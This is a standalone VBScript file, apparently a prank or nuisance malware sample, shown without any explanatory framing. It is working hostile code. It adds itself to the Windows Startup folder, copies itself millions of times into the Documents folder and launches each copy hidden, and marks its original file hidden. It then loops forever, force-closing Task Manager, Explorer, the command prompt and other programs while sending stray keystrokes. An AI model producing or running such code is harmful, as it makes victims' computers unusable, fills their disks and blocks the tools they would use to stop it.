Set WshShell = WScript.CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")

' Add script to Startup folder
strStartupPath = WshShell.SpecialFolders("Startup")
Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.lnk")
objShellLink.TargetPath = WScript.ScriptFullName
objShellLink.Save

' Copy script to Documents folder
strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
For i = 1 to 9999999
    fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & fso.GetFileName(WScript.ScriptFullName) & i & ".vbs", True
    WshShell.Run chr(34) & strDocumentsPath & "\" & fso.GetFileName(WScript.ScriptFullName) & i & ".vbs" & chr(34), 0, False
Next

' Hide the original script
fso.GetFile(WScript.ScriptFullName).Attributes = fso.GetFile(WScript.ScriptFullName).Attributes Or 2 ' Hidden

Do
    For Each strExeName In strExeNames
        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
        Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
        
        If colProcessList.Count > 0 Then
            For Each objProcess In colProcessList
                WshShell.AppActivate objProcess.ProcessId
                WScript.Sleep 0 'wait for window to activate before closing
                WshShell.SendKeys "%{F4}" 'sends Alt+F4 to close window
            Next
        End If
    Next
    
    'Type "n" into search bar with focus
    WshShell.SendKeys "n"
    
    WScript.Sleep 0 'wait before checking again
Loop
